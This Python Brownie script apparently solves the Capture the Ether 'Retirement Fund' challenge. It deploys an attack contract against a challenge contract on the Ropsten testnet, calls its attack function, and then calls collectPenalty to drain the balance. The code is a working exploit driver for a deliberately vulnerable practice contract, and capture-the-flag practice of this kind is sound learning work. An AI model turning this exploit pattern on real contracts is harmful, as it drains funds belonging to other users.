from scripts.helpful_scripts import POINT_ONE, get_account, ONE
from brownie import RetirementFundChallenge, AttackRetirementFund, network, Contract


# for local test
def deploy_contract(contract, arg=None, value=0):
    account = get_account()
    return contract.deploy(arg, {"from": account, "value": value})


def main():
    # print(network.show_active())
    account = get_account()

    # for local test
    # contract = deploy_contract(RetirementFundChallenge, account, ONE)
    # # on ropsten network
    contract_address = "0xedF3780e11C3f0f71ba61bf17F591eCB958E56d3"
    contract = Contract.from_abi(
        RetirementFundChallenge._name,
        contract_address,
        RetirementFundChallenge.abi,
    )

    attack_contract = deploy_contract(
        AttackRetirementFund, contract, 1
    )  # be sure to give some money to the attack contract
    print(f"balance of the contract: {contract.balance()}")
    attack_contract.attack({"from": account})
    print(f"balance of the contract: {contract.balance()}")
    contract.collectPenalty({"from": account})
    print(f"balance of the contract: {contract.balance()}")
